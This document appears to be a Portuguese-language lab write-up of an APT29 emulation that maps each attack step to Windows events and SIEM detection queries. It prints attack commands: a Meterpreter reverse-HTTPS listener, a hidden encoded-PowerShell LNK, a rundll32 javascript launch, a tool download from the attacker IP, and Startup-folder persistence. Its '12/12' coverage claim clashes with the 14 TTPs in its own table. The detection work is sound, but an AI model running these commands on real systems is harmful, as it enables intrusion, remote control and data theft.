# Timeline do Ataque APT29 — Cozy Bear

> Esta timeline documenta a sequência real de técnicas executadas durante a emulação do APT29 neste laboratório. Cada fase representa uma etapa do ciclo de ataque com o TTP correspondente no MITRE ATT&CK, o comando executado, o evento gerado no Windows e a evidência capturada pelo SIEM.

---

## Visão Geral do Ataque

```
Fase 1          Fase 2          Fase 3          Fase 4          Fase 5
Initial    -->  Execution  -->  Defense    -->  Discovery  -->  Collection
Access          + C2            Evasion                         + Persistence
T1566.002       T1059.001       T1027           T1087           T1560
T1204.002       T1218.011       T1071.001       T1069           T1547.009
                                                T1082           T1105
                                                T1057
                                                T1012
```

O ataque começa com um link malicioso enviado à vítima que descarrega um ficheiro LNK. Ao abrir o ficheiro, o PowerShell executa um payload ofuscado que estabelece uma sessão Meterpreter com o Kali-Attack. A partir daí o atacante realiza reconhecimento do ambiente, comprime dados sensíveis e instala persistência na pasta Startup para sobreviver a reboots.

---

## Fase 1 — Initial Access

### T1566.002 — Spearphishing Link

O atacante envia um link malicioso que força o download de um ficheiro LNK através do Microsoft Edge. A vítima vê um ficheiro aparentemente legítimo mas que contém um comando PowerShell escondido.

**Comando executado no Kali:**
```bash
./auto-lnk.sh
python3 -m http.server 8080
```

**O que acontece no WIN-DC01:**

O Microsoft Edge descarrega o ficheiro `ds7002.lnk` para a pasta Downloads. O Sysmon regista a criação do processo e o Wazuh captura o evento.

**Evento gerado:**
```
EventID: 11 (Sysmon FileCreate)
TargetFilename: C:\Users\Administrator\Downloads\ds7002.lnk
Image: msedge.exe
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*msedge* OR data.win.eventdata.image:*msedge*
```

---

### T1204.002 — Malicious File (LNK)

A vítima clica no ficheiro LNK. O Windows executa o comando escondido dentro do shortcut que invoca o PowerShell com parâmetros de evasão.

**Conteúdo do LNK:**
```
Target: C:\Windows\System32\cmd.exe
Arguments: /c powershell.exe -ep bypass -w hidden -e <BASE64_PAYLOAD>
```

**Evento gerado:**
```
EventID: 1 (Sysmon ProcessCreate)
Image: C:\Windows\System32\cmd.exe
CommandLine: /c powershell.exe -ep bypass -w hidden -e <encoded>
ParentImage: explorer.exe
```

---

## Fase 2 — Execution e Command and Control

### T1059.001 — PowerShell Execution

O PowerShell executa o payload que estabelece a ligação reversa com o listener Metasploit no Kali-Attack. A sessão Meterpreter fica activa como `LAB\Administrator`.

**Comando no Kali (listener):**
```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/meterpreter/reverse_https; \
  set LHOST 192.168.10.102; \
  set LPORT 443; \
  run -j"
```

**Evento gerado:**
```
EventID: 4103 (PowerShell Module Logging)
EventID: 4104 (PowerShell Script Block Logging)
ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString(...)
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*powershell* OR
data.win.eventdata.image:*powershell.exe*
```

---

### T1071.001 — C2 via HTTPS (porta 443)

A comunicação entre o Meterpreter e o Kali usa HTTPS na porta 443 para parecer tráfego legítimo e evadir firewalls que bloqueiam portas não standard.

**Evento gerado:**
```
EventID: 3 (Sysmon NetworkConnect)
DestinationPort: 443
Image: powershell.exe
DestinationIp: 192.168.10.102
```

---

### T1027 — Obfuscation

O payload é codificado em Base64 com o parâmetro `-EncodedCommand` e usa `-ExecutionPolicy Bypass` para contornar as políticas de execução do PowerShell.

**Comando:**
```powershell
powershell.exe -ep bypass -w hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
```

**Evento gerado:**
```
EventID: 4104 (Script Block Logging)
ScriptBlockText: contém o payload decodificado
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*bypass* OR
data.win.eventdata.commandLine:*encodedcommand* OR
data.win.eventdata.commandLine:*-enc*
```

---

### T1218.011 — Rundll32

O Rundll32 é usado para executar código malicioso de forma a parecer uma operação legítima do sistema, evitando a detecção por soluções que bloqueiam apenas o PowerShell directo.

**Comando:**
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";...
```

**Evento gerado:**
```
EventID: 1 (Sysmon ProcessCreate)
Image: C:\Windows\System32\rundll32.exe
CommandLine: rundll32.exe javascript:...
```

**Detecção no SIEM:**
```
data.win.eventdata.image:*rundll32* OR
data.win.eventdata.commandLine:*rundll32*
```

---

## Fase 3 — Discovery

Com a sessão Meterpreter activa, o atacante realiza reconhecimento do ambiente para perceber onde está, quem são os utilizadores e quais os processos em execução.

### T1087 — Account Discovery

```powershell
# Executado na sessão Meterpreter
shell
net user
net user /domain
```

**Evento gerado:**
```
EventID: 4688 (Process Creation)
NewProcessName: net.exe
CommandLine: net user /domain
```

**Utilizadores descobertos no lab:**
```
r.anderson    m.torres    s.connor
svc.backup    madAdmin    Administrator
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*net user*
```

---

### T1069 — Permission Groups Discovery

```powershell
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

**Evento gerado:**
```
EventID: 4688
CommandLine: net group "Domain Admins" /domain
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*net group*
```

---

### T1082 — System Information Discovery

```powershell
systeminfo
```

**Evento gerado:**
```
EventID: 4688
NewProcessName: systeminfo.exe
```

**Output relevante:**
```
OS Name: Microsoft Windows Server 2022
Domain: lab.local
Logon Server: \\WIN-DC01
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*systeminfo*
```

---

### T1057 — Process Discovery

```powershell
tasklist
tasklist /v
```

**Evento gerado:**
```
EventID: 4688
NewProcessName: tasklist.exe
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*tasklist*
```

---

### T1012 — Registry Query

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

**Evento gerado:**
```
EventID: 4688
NewProcessName: reg.exe
CommandLine: reg query HKLM\...
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*reg query*
```

---

## Fase 4 — Collection e Persistence

### T1560 — Archive Collected Data

O atacante comprime os dados recolhidos usando o 7-Zip instalado no sistema para preparar a exfiltração.

```powershell
7z a -tzip C:\Users\Public\data.zip C:\Users\Administrator\Documents\*
```

**Evento gerado:**
```
EventID: 1 (Sysmon ProcessCreate)
Image: C:\Program Files\7-Zip\7z.exe
CommandLine: 7z a -tzip C:\Users\Public\data.zip ...
EventID: 11 (Sysmon FileCreate)
TargetFilename: C:\Users\Public\data.zip
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*7z* OR
data.win.eventdata.image:*7z.exe*
```

---

### T1105 — Ingress Tool Transfer

O atacante descarrega ferramentas adicionais para o sistema comprometido usando o Invoke-WebRequest do PowerShell.

```powershell
Invoke-WebRequest -Uri "http://192.168.10.102:8080/tool.exe" `
  -OutFile "C:\Users\Public\tool.exe"
```

**Evento gerado:**
```
EventID: 4104 (Script Block Logging)
ScriptBlockText: Invoke-WebRequest -Uri http://192.168.10.102:8080/tool.exe
EventID: 3 (Sysmon NetworkConnect)
DestinationPort: 8080
```

**Detecção no SIEM:**
```
data.win.eventdata.commandLine:*Invoke-WebRequest*
```

---

### T1547.009 — Startup Folder Persistence

Para garantir que o acesso persiste após um reboot, o atacante copia um payload para a pasta Startup do utilizador. Na próxima vez que o utilizador fizer login o payload executa automaticamente.

```powershell
Copy-Item "C:\Users\Public\payload.lnk" `
  "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**Evento gerado:**
```
EventID: 11 (Sysmon FileCreate)
TargetFilename: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\
                Start Menu\Programs\Startup\payload.lnk
```

**Detecção no SIEM:**
```
data.win.eventdata.targetFilename:*Startup* OR
data.win.eventdata.commandLine:*Startup*
```

---

## Resultados da Emulação

| TTP | Técnica | Fase | Severity | Detectado |
|---|---|---|---|---|
| T1566.002 | Spearphishing Link | Initial Access | High | ✅ |
| T1204.002 | Malicious File LNK | Initial Access | High | ✅ |
| T1059.001 | PowerShell Execution | Execution | High | ✅ |
| T1071.001 | C2 HTTPS | Command and Control | High | ✅ |
| T1027 | Obfuscation | Defense Evasion | High | ✅ |
| T1218.011 | Rundll32 | Defense Evasion | High | ✅ |
| T1087 | Account Discovery | Discovery | Medium | ✅ |
| T1069 | Permission Groups | Discovery | Medium | ✅ |
| T1082 | System Info | Discovery | Medium | ✅ |
| T1057 | Process Discovery | Discovery | Medium | ✅ |
| T1012 | Registry Query | Discovery | Medium | ✅ |
| T1560 | Archive Data | Collection | High | ✅ |
| T1105 | Tool Transfer | Command and Control | High | ✅ |
| T1547.009 | Startup Persistence | Persistence | High | ✅ |

**Coverage total: 12/12 TTPs detectados — 100%**

---

## Evidências no Kibana

Após a execução completa do ataque o SIEM registou 188 alertas distribuídos pelas 12 regras de detecção criadas via API.

Para visualizar as evidências no teu lab abre o Kibana em `http://SOC-CORE:5601` e navega para:

```
Security -> Alerts
Security -> Rules -> Detection Rules (SIEM)
Dashboards -> APT29 Emulation — SOC Dashboard
```

---

## Referências MITRE ATT&CK

- [APT29 Group Page](https://attack.mitre.org/groups/G0016/)
- [T1566.002 Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)
- [T1059.001 PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [T1027 Obfuscated Files](https://attack.mitre.org/techniques/T1027/)
- [T1218.011 Rundll32](https://attack.mitre.org/techniques/T1218/011/)
- [T1087 Account Discovery](https://attack.mitre.org/techniques/T1087/)
- [T1560 Archive Collected Data](https://attack.mitre.org/techniques/T1560/)
- [T1547.009 Shortcut Modification](https://attack.mitre.org/techniques/T1547/009/)
- [T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
